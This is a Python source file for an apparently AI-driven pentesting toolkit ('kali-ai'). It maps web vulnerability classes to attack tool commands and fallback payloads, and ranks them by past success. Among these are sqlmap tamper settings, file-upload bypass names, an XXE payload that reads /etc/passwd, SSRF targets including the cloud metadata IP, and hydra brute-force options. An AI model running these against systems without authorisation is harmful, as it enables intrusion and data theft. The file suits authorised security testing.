#!/usr/bin/env python3
"""
Tool selector for kali-ai.

Smart tool selection matrix with recommendations, parameters, and custom approaches.
Uses strategy memory to include what worked in similar scenarios.

Usage: python3 /tools/tool_selector.py <command> [args]
"""

import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional

WORK_DIR = Path(os.environ.get("KALI_WORK_DIR") or ("/work" if Path("/work").exists() else "work"))
MEMORY_DIR = WORK_DIR / "memory"
STRATEGY_FILE = MEMORY_DIR / "strategy.json"

TOOL_MATRIX = {
    "sql-injection": {
        "first_tool": "sqlmap --batch --random-agent --level=3 --risk=2",
        "if_blocked": "sqlmap --batch --random-agent --tamper=space2comment --level=5 --risk=3",
        "if_no_result": "manual time-based blind with curl (use python script for binary search)",
        "custom_approach": "custom Python time-based blind script with binary search and response time analysis",
        "parameters": {
            "rate_limit": "--delay=1",
            "random_agent": "--random-agent",
            "log_file": "--output-dir=/work/loot/<target>/sqlmap/",
            "threads": "--threads=4",
        },
    },
    "xss": {
        "first_tool": "xsstrike --crawl --blind",
        "if_blocked": "dalfox url --blind --mining-dom",
        "if_no_result": "manual polyglot payload with curl",
        "custom_approach": "custom DOM-based XSS with Playwright (payload injection and execution verification)",
        "parameters": {
            "rate_limit": "--delay=1",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/xss/",
        },
    },
    "ssrf": {
        "first_tool": "ssrfmap -r <url>",
        "if_blocked": "gopherus --exploit <url>",
        "if_no_result": "manual internal IP scan with curl (169.254.169.254, 127.0.0.1, 10.x, 172.16.x, 192.168.x)",
        "custom_approach": "custom Python SSRF with DNS rebinding and OOB detection",
        "parameters": {
            "rate_limit": "--delay=1",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/ssrf/",
        },
    },
    "lfi": {
        "first_tool": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity.txt -u <url> -mc 200",
        "if_blocked": "manual path traversal with curl (../../../../etc/passwd)",
        "if_no_result": "PHP wrappers (php://filter, expect://, data://)",
        "custom_approach": "custom Python LFI with wrapper detection and log poisoning",
        "parameters": {
            "rate_limit": "-rate 50",
            "random_agent": "-H 'User-Agent: <random>'",
            "log_file": "-o /work/loot/<target>/lfi/ffuf.json",
        },
    },
    "command-injection": {
        "first_tool": "commix --url=<url> --batch",
        "if_blocked": "manual time-based with curl (sleep 5)",
        "if_no_result": "out-of-band with interactsh (dns callback)",
        "custom_approach": "custom Python OOB with DNS callback and response analysis",
        "parameters": {
            "rate_limit": "--delay=1",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/commix/",
        },
    },
    "file-upload": {
        "first_tool": "manual extension bypass with curl (shell.php.jpg, shell.jpg.php, shell.pHp)",
        "if_blocked": "content-type bypass with curl (Content-Type: image/jpeg)",
        "if_no_result": "magic bytes bypass with curl (GIF89a; shell.php)",
        "custom_approach": "custom Python upload with double extension and content-type manipulation",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/upload/",
        },
    },
    "auth-bypass": {
        "first_tool": "hydra -L users.txt -P passwords.txt <target> http-post-form -t 4 -w 30",
        "if_blocked": "manual password spray with curl (1 req/sec)",
        "if_no_result": "JWT algorithm confusion (HS256/RS256 key confusion)",
        "custom_approach": "custom Python auth logic analysis with response differentiation",
        "parameters": {
            "rate_limit": "-t 4 -w 30",
            "random_agent": "-H 'User-Agent: <random>'",
            "log_file": "-o /work/loot/<target>/auth/hydra.txt",
        },
    },
    "idor": {
        "first_tool": "burp intruder with ID enumeration",
        "if_blocked": "manual ID enumeration with curl (1, 2, 3, ..., 1000)",
        "if_no_result": "predictable ID analysis (uuid, hash, timestamp)",
        "custom_approach": "custom Python IDOR with pattern detection and response analysis",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/idor/",
        },
    },
    "xxe": {
        "first_tool": "manual XXE with curl (<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>)",
        "if_blocked": "XXE with parameter entities",
        "if_no_result": "XXE with DTD retrieval",
        "custom_approach": "custom Python XXE with DTD generation and OOB detection",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/xxe/",
        },
    },
    "ssti": {
        "first_tool": "tplmap --url=<url>",
        "if_blocked": "manual SSTI with curl ({{7*7}}, ${7*7}, <%= 7*7 %>)",
        "if_no_result": "template engine detection and specific payload",
        "custom_approach": "custom Python SSTI with engine detection and payload generation",
        "parameters": {
            "rate_limit": "--delay=1",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/ssti/",
        },
    },
    "csrf": {
        "first_tool": "manual CSRF with burp (generate PoC)",
        "if_blocked": "manual CSRF with curl (no CSRF token)",
        "if_no_result": "CSRF with XSS (steal token first)",
        "custom_approach": "custom Python CSRF with token analysis and PoC generation",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/csrf/",
        },
    },
    "jwt": {
        "first_tool": "jwt_tool -t <target> -M at",
        "if_blocked": "manual JWT analysis with python (header, payload, signature)",
        "if_no_result": "JWT algorithm confusion (HS256/RS256 key confusion)",
        "custom_approach": "custom Python JWT with algorithm confusion and token forgery",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/jwt/",
        },
    },
    "deserialization": {
        "first_tool": "ysoserial -p <payload> -c <command>",
        "if_blocked": "manual deserialization with python (pickle, java, php, .net)",
        "if_no_result": "custom gadget chain generation",
        "custom_approach": "custom Python deserialization with gadget chain generation and verification",
        "parameters": {
            "rate_limit": "1 req/sec",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/deserialization/",
        },
    },
    "race-condition": {
        "first_tool": "manual race condition with python threading",
        "if_blocked": "race condition with burp turbo intruder",
        "if_no_result": "single-packet attack with curl",
        "custom_approach": "custom Python race condition with threading and simultaneous request flooding",
        "parameters": {
            "rate_limit": "no limit (race condition)",
            "random_agent": "--user-agent",
            "log_file": "--output=/work/loot/<target>/race/",
        },
    },
}


def _load_strategy() -> Dict[str, Any]:
    if not STRATEGY_FILE.exists():
        return {"scenarios": {}, "tool_effectiveness": {}}
    try:
        return json.loads(STRATEGY_FILE.read_text())
    except Exception:
        return {"scenarios": {}, "tool_effectiveness": {}}


def select_tool(vulnerability_type: str, constraints: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Select the best tool for a vulnerability type."""
    constraints = constraints or {}
    strategy = _load_strategy()

    if vulnerability_type not in TOOL_MATRIX:
        return {
            "error": f"unknown vulnerability type: {vulnerability_type}",
            "available_types": sorted(TOOL_MATRIX.keys()),
        }
    matrix = TOOL_MATRIX[vulnerability_type]
    scenario = strategy.get("scenarios", {}).get(f"web-app:{vulnerability_type}", {})

    # Get best tools from strategy memory
    best_tools = []
    if scenario.get("tool_effectiveness"):
        sorted_tools = sorted(scenario["tool_effectiveness"].items(), key=lambda x: x[1].get("success", 0), reverse=True)
        best_tools = [t for t, _ in sorted_tools[:5]]

    return {
        "vulnerability_type": vulnerability_type,
        "first_tool": matrix.get("first_tool", "manual analysis"),
        "if_blocked": matrix.get("if_blocked", "try different approach"),
        "if_no_result": matrix.get("if_no_result", "manual verification"),
        "custom_approach": matrix.get("custom_approach", "custom Python script"),
        "parameters": matrix.get("parameters", {}),
        "best_tools_from_memory": best_tools,
        "confidence": scenario.get("confidence", 0),
        "success_rate": scenario.get("success_rate", 0),
        "run_count": scenario.get("run_count", 0),
    }


def tool_to_markdown(selection: Dict[str, Any]) -> str:
    """Convert a tool selection to markdown."""
    lines = [
        f"## Tool Selection: {selection['vulnerability_type']}",
        f"**Confidence**: {selection['confidence']:.2f} (based on {selection['run_count']} past runs, {selection['success_rate']:.1%} success)",
        "",
        f"**First Tool**: `{selection['first_tool']}`",
        f"**If Blocked**: `{selection['if_blocked']}`",
        f"**If No Result**: `{selection['if_no_result']}`",
        f"**Custom Approach**: `{selection['custom_approach']}`",
        "",
        "**Parameters**:",
    ]
    for key, value in selection["parameters"].items():
        lines.append(f"- `{key}`: `{value}`")

    if selection["best_tools_from_memory"]:
        lines.extend([
            "",
            "**Best Tools from Memory**:",
        ])
        for tool in selection["best_tools_from_memory"]:
            lines.append(f"- {tool}")

    return "\n".join(lines)


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1]
    args = sys.argv[2:]

    if cmd == "select":
        if not args:
            print("Usage: tool_selector.py select <vulnerability_type> [constraints-json]")
            sys.exit(1)
        constraints = json.loads(args[1]) if len(args) > 1 else None
        print(json.dumps(select_tool(args[0], constraints), indent=2))
    elif cmd == "markdown":
        if not args:
            print("Usage: tool_selector.py markdown <vulnerability_type> [constraints-json]")
            sys.exit(1)
        constraints = json.loads(args[1]) if len(args) > 1 else None
        print(tool_to_markdown(select_tool(args[0], constraints)))
    else:
        print(f"Unknown command: {cmd}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
